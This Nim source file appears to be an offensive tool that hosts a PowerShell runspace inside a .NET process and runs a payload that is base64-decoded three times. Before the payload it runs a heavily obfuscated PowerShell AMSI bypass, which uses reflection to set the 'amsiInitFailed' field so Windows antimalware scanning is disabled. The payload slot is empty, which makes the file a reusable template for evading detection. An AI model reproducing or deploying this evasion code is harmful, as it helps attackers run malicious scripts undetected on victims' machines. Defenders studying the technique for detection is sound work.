#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    References:
        - https://gist.github.com/cpoDesign/66187c14092ceb559250183abbf9e774
]# 

import winim/clr
import std/base64

var Automation = load("System.Management.Automation")
var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")

var runspace = @RunspaceFactory.CreateRunspace()
runspace.Open()

var payload = """"""
var bypass = """$zoV=$null;$rempxof="$(('Syst'+'em').NORMAlIZe([CHar](70+38-38)+[cHAr]([ByTE]0x6f)+[Char](9+105)+[chAr]([ByTE]0x6d)+[CHAr]([bYTE]0x44)) -replace [cHar]([bYTe]0x5c)+[CHAr]([bytE]0x70)+[CHaR]([BYTe]0x7b)+[CHAr]([ByTE]0x4d)+[CHAR]([bYtE]0x6e)+[cHAR]([bYTe]0x7d)).$([Char](25+52)+[Char](97*59/59)+[CHAr](110)+[cHaR]([ByTe]0x61)+[CHar]([ByTe]0x67)+[char]([bYTe]0x65)+[ChAR](109)+[ChaR]([BYTE]0x65)+[ChAr]([bytE]0x6e)+[cHAR](116*14/14)).$([chAR]([BytE]0x41)+[cHAr](117)+[chAr]([byTE]0x74)+[cHAR](111)+[cHar](109)+[cHaR]([ByTe]0x61)+[CHar]([bYte]0x74)+[cHar](105*92/92)+[chAR](111+72-72)+[char](99+11)).$([ChAR]([bytE]0x41)+[CHar]([BYte]0x6d)+[cHAr]([bYTE]0x73)+[ChAr]([byte]0x69)+[char]([BytE]0x55)+[ChaR]([BytE]0x74)+[cHar](105+64-64)+[char](108+72-72)+[cHAR]([BYTe]0x73))";$waefxpyubntbmdingy="+[CHAR](112*4/4)+[Char]([BYTE]0x6b)+[CHAR](106*53/53)+[Char]([BYtE]0x76)+[Char](64+46)+[ChaR]([byte]0x72)+[chaR](114*101/101)+[cHAR]([bYte]0x6d)+[CHAr](110*47/47)+[cHar](35+78)+[Char]([bYtE]0x74)+[chAr](122+52-52)+[CHAR](101*82/82)+[ChaR]([byTE]0x6e)+[CHAR]([BytE]0x62)+[ChAr]([BYTe]0x66)+[CHar]([BytE]0x70)+[cHAr]([bytE]0x6c)+[Char]([BYtE]0x79)+[ChaR]([bYTE]0x6e)+[cHaR](114+3-3)+[char]([BYTe]0x78)+[chaR](98+4)";[Threading.Thread]::Sleep(1430);[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType($([cHar]([BYTE]0x53)+[ChAr]([byTE]0x79)+[chAr](17+98)+[ChAr](17+99)+[chAR]([Byte]0x65)+[char](109*59/59)+[CHAr]([bYTE]0x2e)+[CHAR](45+37)+[ChAR]([BYte]0x65)+[cHaR](87+15)+[chAr](108)+[cHAr]([Byte]0x65)+[cHar]([bYTE]0x63)+[char]([bYTe]0x74)+[chAr]([BYTe]0x69)+[ChaR](111*28/28)+[chAr](110*28/28)+[CHAR]([bytE]0x2e)+[CHar]([BytE]0x42)+[ChAR]([BytE]0x69)+[CHar]([BYte]0x6e)+[cHaR]([ByTe]0x64)+[Char](105*16/16)+[CHaR]([BYTe]0x6e)+[chAR](103)+[chAR]([byTe]0x46)+[ChAR](108)+[char]([bYTE]0x61)+[cHAR]([ByTE]0x67)+[cHaR]([bYte]0x73)))).FullName), $(('Syst'+'em').NORMAlIZe([CHar](70+38-38)+[cHAr]([ByTE]0x6f)+[Char](9+105)+[chAr]([ByTE]0x6d)+[CHAr]([bYTE]0x44)) -replace [cHar]([bYTe]0x5c)+[CHAr]([bytE]0x70)+[CHaR]([BYTe]0x7b)+[CHAr]([ByTE]0x4d)+[CHAR]([bYtE]0x6e)+[cHAR]([bYTe]0x7d)).Reflection.FieldInfo]" -as [String].Assembly.GetType($([CHar]([BYTE]0x53)+[char]([ByTe]0x79)+[Char]([bYTE]0x73)+[char](53+63)+[char]([ByTE]0x65)+[CHaR](109+41-41)+[cHAr](46*5/5)+[CHAr]([Byte]0x54)+[cHar]([BYte]0x79)+[cHaR](112*87/87)+[ChAr]([byTE]0x65)))), [Object]([Ref].Assembly.GetType($rempxof)),($([CHaR]([byTE]0x47)+[ChAr](33+68)+[CHaR](116+24-24)+[CHAr]([BYTe]0x46)+[CHar](105+89-89)+[ChAR](101)+[char]([byte]0x6c)+[CHAR](100)))).Invoke($(('ãm'+'sí'+'În'+'ît'+'Fá'+'íl'+'ed').NOrmaLIze([CHAr]([BYTe]0x46)+[CHaR](111*82/82)+[ChaR](114)+[chaR](109+55-55)+[char]([bYTe]0x44)) -replace [chAR](92)+[chAR](112*31/31)+[CHar](123+46-46)+[cHAR]([BYTE]0x4d)+[ChAR]([bytE]0x6e)+[chAr]([bYTE]0x7d)),(("NonPublic,Static") -as [String].Assembly.GetType($([cHar]([BYTE]0x53)+[ChAr]([byTE]0x79)+[chAr](17+98)+[ChAr](17+99)+[chAR]([Byte]0x65)+[char](109*59/59)+[CHAr]([bYTE]0x2e)+[CHAR](45+37)+[ChAR]([BYte]0x65)+[cHaR](87+15)+[chAr](108)+[cHAr]([Byte]0x65)+[cHar]([bYTE]0x63)+[char]([bYTe]0x74)+[chAr]([BYTe]0x69)+[ChaR](111*28/28)+[chAr](110*28/28)+[CHAR]([bytE]0x2e)+[CHar]([BytE]0x42)+[ChAR]([BytE]0x69)+[CHar]([BYte]0x6e)+[cHaR]([ByTe]0x64)+[Char](105*16/16)+[CHaR]([BYTe]0x6e)+[chAR](103)+[chAR]([byTe]0x46)+[ChAR](108)+[char]([bYTE]0x61)+[cHAR]([ByTE]0x67)+[cHaR]([bYte]0x73))))).SetValue($zoV,$True);"""

for _ in 1..3:
    payload = decode(payload)

var pipeline1 = runspace.CreatePipeline()
pipeline1.Commands.AddScript(bypass)

pipeline1.Invoke()

var pipeline2 = runspace.CreatePipeline()
pipeline2.Commands.AddScript(payload)

pipeline2.Invoke()
runspace.Close()
